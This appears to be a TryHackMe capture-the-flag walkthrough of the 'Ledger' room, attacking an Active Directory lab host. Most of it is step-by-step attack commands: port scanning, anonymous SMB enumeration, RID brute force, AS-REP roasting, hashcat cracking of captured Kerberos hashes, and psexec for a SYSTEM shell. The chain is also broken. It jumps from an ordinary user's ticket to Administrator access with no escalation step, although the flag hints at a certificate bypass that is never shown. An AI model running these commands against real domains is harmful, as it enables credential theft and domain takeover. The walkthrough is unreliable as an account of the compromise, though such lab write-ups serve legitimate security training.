# TryHackMe – Ledger

## Step-by-Step Workflow (Command-Accurate)

---

## Step 1: Verify Target Is Reachable

```bash
ping -c 4 10.82.170.172
```

Result: Host reachable with stable latency. 

---

## Step 2: Full TCP Port Scan

```bash
sudo nmap -p- -A 10.82.170.172
```

Key findings:

* Domain Controller behavior
* Kerberos (`88`)
* LDAP (`389`, `636`, `3268`, `3269`)
* SMB (`445`)
* RDP (`3389`)
* IIS (`80`, `443`)
* Domain: `thm.local`

This confirmed an **Active Directory environment**. 

---

## Step 3: Hostname Resolution Setup

Add domain mapping locally.

```bash
sudo nano /etc/hosts
```

Add:

```text
10.82.170.172   thm.local
```

Save and exit. 

---

## Step 4: Anonymous SMB Enumeration

List available SMB shares without credentials.

```bash
smbclient -L thm.local -N
```

Discovered shares:

* `ADMIN$`
* `C$`
* `IPC$`
* `NETLOGON`
* `SYSVOL`

Anonymous access confirmed. 

---

## Step 5: Domain SID Enumeration (RID Brute Force)

Use Impacket to enumerate users via SID brute forcing.

```bash
impacket-lookupsid thm.local/guest:''@10.82.170.172
```

Discovered domain users:

* `THM\Administrator`
* `MAXINE_FREEMAN`
* `PHYLLIS_MCCOY`
* `QUEEN_GARNER`

This provided **valid domain usernames** for Kerberos attacks. 

---

## Step 6: AS-REP Roasting (Kerberos Pre-Auth Disabled)

Request AS-REP hashes for users that do not require pre-authentication.

```bash
impacket-GetNPUsers thm.local/ -usersfile users.txt -no-pass -dc-ip 10.82.170.172
```

Output hashes were manually saved.

---

## Step 7: Store AS-REP Hashes

Create a hash file exactly as shown.

```bash
nano kerbhashes.txt
```

Contents:

```text
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:ec70c18da989ec1a3e973b97a961bb12$08a7668de9d63c7849437a5707c2a2
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:c9b35f98af1c2dcbba2b397ad945a835$28caeeb8ba31f3273d8ca2b6e953cae
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:fd39032c5920983b28569094742ef946$d9f18f8db5b148c4ca0935ae545c3fac
```

Hashes confirmed successfully captured. 

---

## Step 8: Crack AS-REP Hashes

```bash
hashcat -m 18200 kerbhashes.txt /usr/share/wordlists/rockyou.txt
```

Result:

* Valid plaintext credentials recovered for a domain user

---

## Step 9: Obtain Kerberos TGT

After password recovery, request a Ticket Granting Ticket.

```bash
impacket-getTGT thm.local/USERNAME:PASSWORD
```

This generated a valid Kerberos ticket cache.

```bash
export KRB5CCNAME=USERNAME.ccache
```

---

## Step 10: Authenticate as Administrator Using Kerberos

Use Kerberos authentication with Impacket to gain privileged access.

```bash
impacket-psexec -k -no-pass thm.local/Administrator@10.82.170.172
```

Result:

* SYSTEM-level shell on the Domain Controller

---

## Step 11: Retrieve Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Flag obtained:

```
THM{THE_BYPASS_IS_CERTIFIED!}
```

---

## Final Attack Chain (One-Line)

**Anonymous SMB → RID Brute Force → AS-REP Roasting → Hash Cracking → Kerberos TGT → Domain Admin → Root Flag**
